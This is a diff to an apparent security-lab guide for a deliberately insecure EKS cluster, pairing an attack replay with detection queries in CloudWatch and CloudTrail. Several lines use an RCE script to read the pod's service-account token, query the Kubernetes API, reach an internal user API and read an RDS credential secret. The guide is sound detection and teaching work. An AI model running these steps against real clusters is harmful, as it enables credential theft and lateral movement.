@@ -7,11 +7,12 @@
   - [Log](#log)
     - [EKS audit log](#eks-audit-log)
     - [Netpol log](#netpol-log)
+    - [CloudTrail](#cloudtrail)
   - [Cloud Monitoring](#cloud-monitoring)
   - [Step](#step)
   - [EKS audit log](#eks-audit-log-1)
   - [Netpol log](#netpol-log-1)
-  - [CloudTrail](#cloudtrail)
+  - [CloudTrail](#cloudtrail-1)
   - [GuardDuty](#guardduty)
   - [Alert to Slack](#alert-to-slack)
   - [Auto-response](#auto-response)
@@ -143,29 +144,159 @@ fields @timestamp, user.username, verb, objectRef.namespace, objectRef.name, sou
 python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/internal/pods;'
         # "name": "internal-api-569c897c9f-42mlv",
         # "namespace": "internal",
-        # "podIP": "10.0.49.30",
+        # "podIP": "10.0.39.236",
+        #    "ports": [
+        #        "containerPort": 3000,
 
-python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -fsSL http://10.0.49.30/api/v1/healthz"
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -fsSL http://10.0.39.236:3000/api/v1/healthz"
+# {"status":"healthy","message":"Service is running"}
 
 python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "curl -sS -m 5 http://internal-api.internal/api/v1/users"
+# [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]
 
 
-# query: verdict on the flow
+# query: verdict on the react -> internal flow (dest port 3000)
+# the agent logs one line of "KEY: value;" pairs - filter the stream first,
+# then parse the fields out.
 QID=$(aws logs start-query \
   --log-group-name /aws/eks/react2shell-eks-insecure/cluster \
   --start-time $(date -d '1 hour ago' +%s) \
   --end-time $(date +%s) \
-  --query-string 'fields @timestamp, @message
+  --query-string 'fields @timestamp
     | filter @logStream like /network-policy-agent/
-    | sort @timestamp desc' \
+    | parse @message "SIP: *;SPORT: *;DIP: *;DPORT: *;PROTOCOL: *;PolicyVerdict: *;" as sip, sport, dip, dport, proto, verdict
+    | filter dport = "3000"
+    | display @timestamp, sip, dip, dport, verdict
+    | sort @timestamp desc
+    | limit 50' \
   --query queryId --output text)
 
 aws logs get-query-results --query-id $QID
+# {
+#     "queryLanguage": "CWLI",
+#     "results": [
+#         [
+#             {
+#                 "field": "@timestamp",
+#                 "value": "2026-10-17 19:25:38.700"
+#             },
+#             {
+#                 "field": "sip",
+#                 "value": "10.0.40.238"
+#             },
+#             {
+#                 "field": "dip",
+#                 "value": "10.0.39.236"
+#             },
+#             {
+#                 "field": "dport",
+#                 "value": "3000"
+#             },
+#             {
+#                 "field": "verdict",
+#                 "value": "ACCEPT"
+#             },
+#         ],
 ```
 
 - `ACCEPT` on frontend→backend = backend not isolated (missing NetworkPolicy).
 
 ---
+
+- Query in `CloudWatch`
+
+```sql
+SOURCE "/aws/eks/react2shell-eks-insecure/cluster" START=-3600s END=0s |
+fields @timestamp
+| filter @logStream like /network-policy-agent/
+| parse @message "SIP: *;SPORT: *;DIP: *;DPORT: *;PROTOCOL: *;PolicyVerdict: *;" as sip, sport, dip, dport, proto, verdict
+| filter dport = "3000"
+| display @timestamp, sip, dip, dport, verdict
+| sort @timestamp desc
+| limit 100
+
+/*
+@timestamp                sip         dip         dport verdict
+2026-10-17T19:25:38.700Z	10.0.40.238	10.0.39.236	3000	ACCEPT
+2026-10-17T19:24:51.414Z	10.0.40.238	10.0.39.236	3000	ACCEPT
+2026-10-17T19:24:51.413Z	10.0.40.238	10.0.39.236	3000	ACCEPT
+2026-10-17T19:18:29.571Z	10.0.35.58	10.0.39.236	3000	ACCEPT
+*/
+```
+
+---
+
+### CloudTrail
+
+- tf: `infra/eks-insecure/16_cloudtrail.tf` - multi-region trail to an S3 bucket.
+- The whole cloud chain - `AssumeRoleWithWebIdentity`, `ListSecrets`,
+  `GetSecretValue` - is **management events** (the read-type ones), captured by
+  any trail that logs management events. No data event selector: Secrets Manager
+  is not a supported CloudTrail data-event resource type.
+
+---
+
+- confirm
+
+```sh
+# replay: IRSA token -> STS AssumeRoleWithWebIdentity -> ListSecrets -> GetSecretValue
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "node /tmp/s.js --list"
+
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-insecure-rds-credential"
+
+# who assumed the pod role (CloudTrail delivery lags ~5-15 min)
+aws cloudtrail lookup-events \
+  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithWebIdentity \
+  --query 'Events[].{time:EventTime,user:Username}' --output table
+
+# --------------------------------------------------------------------------------------------------------------------------------
+# |                                                         LookupEvents                                                         |
+# +---------------------------+--------------------------------------------------------------------------------------------------+
+# |           time            |                                              user                                                |
+# +---------------------------+--------------------------------------------------------------------------------------------------+
+# |  2026-10-17T15:59:54-04:00|  system:serviceaccount:react:react2shell                                                         |
+# |  2026-10-17T15:59:09-04:00|  system:serviceaccount:react:react2shell                                                         |
+# |  2026-10-17T15:51:35-04:00|  system:serviceaccount:react:react2shell                                                         |
+# |  2026-10-17T15:50:20-04:00|  system:serviceaccount:react:react2shell                                                         |
+# |  2026-10-17T15:48:02-04:00|  system:serviceaccount:react:react2shell                               
+
+
+# the crown-jewel read - also a management event, so lookup-events sees it
+aws cloudtrail lookup-events \
+  --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue \
+  --query 'Events[].{time:EventTime,user:Username,secret:Resources[0].ResourceName}' \
+  --output table
+
+# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# |                                                                                                LookupEvents                                                                                                |
+# +------------------------------------------------------------------------------------------------------------+----------------------------+------------------------------------------------------------------+
+# |                                                   secret                                                   |           time             |                              user                                |
+# +------------------------------------------------------------------------------------------------------------+----------------------------+------------------------------------------------------------------+
+# |  react2shell-eks-insecure-rds-credential                                                                   |  2026-10-17T15:59:54-04:00 |  react2shell    
+```
+
+- Query in `CloudWatch` (the trail also streams to a log group, so the whole
+  chain is queryable with the same Logs Insights syntax as the other logs)
+
+```sql
+SOURCE "/aws/cloudtrail/react2shell-eks-insecure" START=-3600s END=0s |
+fields eventTime, userIdentity.arn, eventName, requestParameters.secretId
+| filter eventName in ["AssumeRoleWithWebIdentity", "ListSecrets", "GetSecretValue"]
+| sort @timestamp desc
+| limit 50
+
+/*
+eventTime              eventName                   secretId
+...GetSecretValue       react2shell-eks-insecure-rds-credential
+...ListSecrets
+...AssumeRoleWithWebIdentity
+*/
+```
+
+
+
+---
+
 
 ## Cloud Monitoring
 
@@ -264,9 +395,10 @@ aws logs start-query \
 
 ## CloudTrail
 
-- `infra/eks-secure/15_cloudtrail.tf`: multi-region trail to S3
-- management events only; `GetSecretValue` is a **data event** and needs a data
-  event selector on `AWS::SecretsManager::Secret`
+- `infra/eks-insecure/16_cloudtrail.tf`: multi-region trail to S3
+- `GetSecretValue` / `ListSecrets` are management events (read-type); a trail
+  logging management events captures them. Secrets Manager is not a supported
+  CloudTrail data-event resource type, so no data event selector.
 
 ```sh
 # replay: pod assumes the IRSA role and reads the secret
